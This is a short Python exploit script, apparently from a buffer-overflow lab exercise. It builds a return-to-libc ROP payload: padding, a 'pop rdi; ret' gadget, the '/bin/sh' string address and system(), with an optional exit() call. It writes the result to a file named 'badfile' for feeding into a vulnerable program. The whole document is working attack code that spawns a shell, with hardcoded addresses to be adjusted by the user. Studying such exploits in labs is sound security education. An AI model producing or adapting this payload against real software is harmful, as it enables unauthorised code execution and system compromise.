#!/usr/bin/env python3
import struct

def p64(val):
    return struct.pack("<Q", val)

# Addresses from your analysis:
system_addr   = 0x7ffff7de3d70   # system()
binsh_addr    = 0x7ffff7f6b678   # "/bin/sh"
exit_addr     = 0x7ffff7dd85f0   # exit()
pop_rdi_addr  = 0x4006a3         # Gadget: pop rdi; ret

# Adjust the offset to your precise value (e.g., 112 bytes)
offset = 112  # (verify in gdb)

payload = bytearray(b"A" * offset)

# ROP frame: pop rdi; ret, then system("/bin/sh")
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

# Optional: Call exit(0) to exit cleanly
payload += p64(pop_rdi_addr)
payload += p64(0)
payload += p64(exit_addr)

with open("badfile", "wb") as f:
    f.write(payload)
